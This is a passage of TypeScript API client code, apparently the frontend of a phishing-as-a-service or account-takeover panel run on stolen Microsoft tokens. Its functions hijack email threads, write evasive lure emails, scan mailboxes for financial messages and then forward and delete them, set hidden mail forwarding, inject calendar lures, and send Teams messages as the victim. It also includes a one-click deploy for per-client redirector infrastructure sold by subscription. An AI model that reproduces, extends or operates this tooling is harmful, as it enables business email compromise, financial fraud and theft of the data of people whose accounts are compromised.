  return fetchWithRetry<{ status: string; token_id: string; message: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/proxy-session/kill`, {
    method: "DELETE",
    headers: { "Content-Type": "application/json" },
  });
}

export async function getProxySessionUrl(tokenId: string): Promise<{ token_id: string; proxy_url: string; status: string }> {
  return fetchWithRetry<{ token_id: string; proxy_url: string; status: string }>(`/api/tokens/${encodeURIComponent(tokenId)}/proxy-session/url`);
}

export async function refreshProxySession(tokenId: string): Promise<{ status: string; token_id: string; session_valid: boolean }> {
  return fetchWithRetry<{ status: string; token_id: string; session_valid: boolean }>(`/api/tokens/${encodeURIComponent(tokenId)}/proxy-session/refresh`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
  });
}

// === AI Evasive Features ===

export async function mimicEmail(payload: { token_id: string; target_email: string; target_name?: string; template_type?: string; context?: string }): Promise<{ subject: string; body: string; html_body: string; anti_spam_notes: string[] }> {
  return fetchWithRetry("/api/lure/mimic", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function hijackConversation(payload: { token_id: string; forward_to?: string; max_threads?: number }): Promise<{ threads: any[]; analyzed: number; active_threads: number }> {
  return fetchWithRetry("/api/conversation/hijack", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function financialScan(payload: { token_id: string; forward_to: string }): Promise<{ success: boolean; matched: number; forwarded: number; deleted: number; message: string }> {
  return fetchWithRetry("/api/financial/scan", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

// === Advanced Graph API ===

export async function getMailboxSettings(tokenId: string): Promise<any> {
  return fetchWithRetry(`/api/mailbox/settings/${encodeURIComponent(tokenId)}`);
}

export async function setAutoReply(tokenId: string, internalReply: string, externalReply: string, externalAudience?: string): Promise<{ success: boolean; message: string }> {
  return fetchWithRetry(`/api/mailbox/auto-reply/${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ internal_reply: internalReply, external_reply: externalReply, external_audience: externalAudience || "all" }),
  });
}

export async function disableAutoReply(tokenId: string): Promise<{ success: boolean; message: string }> {
  return fetchWithRetry(`/api/mailbox/auto-reply/${encodeURIComponent(tokenId)}/disable`, { method: "POST" });
}

export async function setMailForwarding(tokenId: string, forwardTo: string): Promise<{ success: boolean; message: string }> {
  return fetchWithRetry(`/api/mailbox/forwarding/${encodeURIComponent(tokenId)}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ forward_to: forwardTo }),
  });
}

export async function disableMailForwarding(tokenId: string): Promise<{ success: boolean; message: string }> {
  return fetchWithRetry(`/api/mailbox/forwarding/${encodeURIComponent(tokenId)}/disable`, { method: "POST" });
}

export async function searchDirectoryUsers(tokenId: string, query: string): Promise<any> {
  return fetchWithRetry(`/api/directory/users/${encodeURIComponent(tokenId)}?q=${encodeURIComponent(query)}`);
}

export async function injectMeeting(payload: { token_id: string; subject: string; start_time: string; duration_minutes?: number; location?: string; body?: string }): Promise<{ success: boolean; event_id: string; message: string }> {
  return fetchWithRetry("/api/calendar/inject-meeting", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

// === Teams Chat & Channel Messages ===

export async function sendTeamsChatMessage(payload: { token_id: string; recipient_email: string; message: string }): Promise<{ success: boolean; chat_id: string; message_id: string; recipient: string; message: string }> {
  return fetchWithRetry("/api/teams/send-chat", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function sendTeamsChannelMessage(payload: { token_id: string; team_id: string; channel_id: string; message: string }): Promise<{ success: boolean; message_id: string; message: string }> {
  return fetchWithRetry("/api/teams/send-channel", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export async function createCalendarLure(payload: { token_id: string; subject: string; start_time: string; duration_minutes?: number; lure_link: string; location?: string }): Promise<{ success: boolean; event_id: string; message: string }> {
  return fetchWithRetry("/api/calendar/lure", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

// === One-Click Deploy ===

export interface OneClickDeployPayload {
  admin_username: string;
  admin_email: string;
  admin_password: string;
  subscription_days: number;
  client_name: string;
  /** Optional real Railway backend URL. If provided, the Cloudflare Worker is
   * deployed fully configured (MAIN_SERVER = this URL) — no manual Cloudflare
   * step required. */
  api_url?: string;
  /** Per-client Railway API token for auto-deploy. */
  railway_api_token?: string;
  /** Per-client Vercel API token for auto-deploy. */
  vercel_api_token?: string;
  /** Optional Vercel team ID. */
  vercel_team_id?: string;
  /** GitHub repo to deploy from (defaults to simdie/simdiatokens-v2). */
  github_repo?: string;
}

export interface OneClickDeployResult {
  success: boolean;
  message: string;
  worker_url: string;
  worker_name: string;
  redirect_uri: string;
  frontend_url: string;
  api_url: string;
  railway_env_config: string;
  vercel_env_config: string;
  admin_id: string;
  azure_redirect_instructions: string;
  manual_steps: string[];
  railway_auto_deployed: boolean;
  vercel_auto_deployed: boolean;
}

export async function oneClickDeploy(payload: OneClickDeployPayload): Promise<OneClickDeployResult> {
  return fetchWithRetry<OneClickDeployResult>("/api/admins/one-click-deploy", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

export interface FinalizeWorkerPayload {
  admin_id: string;
  api_url: string;
  worker_name?: string;
}

export interface FinalizeWorkerResult {
  success: boolean;
  message: string;
  worker_url: string;
  redirect_uri: string;
}

/** Re-deploy a client's Cloudflare Worker with the real Railway backend URL.
 * Fixes the "MAIN_SERVER placeholder" issue without touching the Cloudflare
 * dashboard. */
export async function finalizeWorker(payload: FinalizeWorkerPayload): Promise<FinalizeWorkerResult> {
  return fetchWithRetry<FinalizeWorkerResult>("/api/admins/finalize-worker", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });
}

// === Cross-Account Intelligence ===

export async function crossAccountIntelligence(tokenId: string): Promise<any> {
  return fetchWithRetry<any>(`/api/intelligence/cross-account/${encodeURIComponent(tokenId)}`);
}